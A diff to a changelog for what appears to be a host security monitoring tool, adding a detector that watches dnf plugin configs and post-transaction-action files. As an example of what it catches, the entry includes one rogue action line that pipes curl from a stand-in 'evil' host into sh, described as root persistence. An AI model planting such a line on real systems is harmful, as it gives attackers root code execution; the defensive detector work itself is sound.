@@ -6,6 +6,24 @@ Versioning: [SemVer](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added — module-ecosystem batch 61: continuation 143→144 (2026-05-26)
+
+Per operator direction ("keep mining niche detectors"). Adds the dnf/RPM
+package-transaction exec surface (the dnf sibling of apt-hooks); L1
+module-contracts coherent at 144, cargo modules::tests 16/16.
+
+- `dnf-plugins-watchdog` (144) — boot+daily delta of the dnf plugin
+  config + post-transaction-actions (/etc/dnf/plugins/*.conf +
+  /etc/dnf/plugins/post-transaction-actions.d/*.action) + ownership +
+  command scan. The dnf post-transaction-actions plugin runs a command AS
+  ROOT after a matching package transaction (the RPM-side equivalent of
+  apt's DPkg::Post-Invoke); a rogue .action (`*:in:curl evil|sh`) is
+  root-exec persistence that fires on the next dnf install/update (T1546).
+  A command under /tmp /home /dev/shm, world-writable, bare/relative, an
+  injection pattern, or a world-writable/non-root file is alert;
+  add/change/remove is warn. No-ops cleanly if absent. Distinct from
+  dnf-automatic-config (auto-update policy). Cadence boot+42min / 09:35.
+
 ### Added — module-ecosystem batch 60: continuation 142→143 (2026-05-26)
 
 Per operator direction ("keep mining niche detectors"). Adds the rsyslog
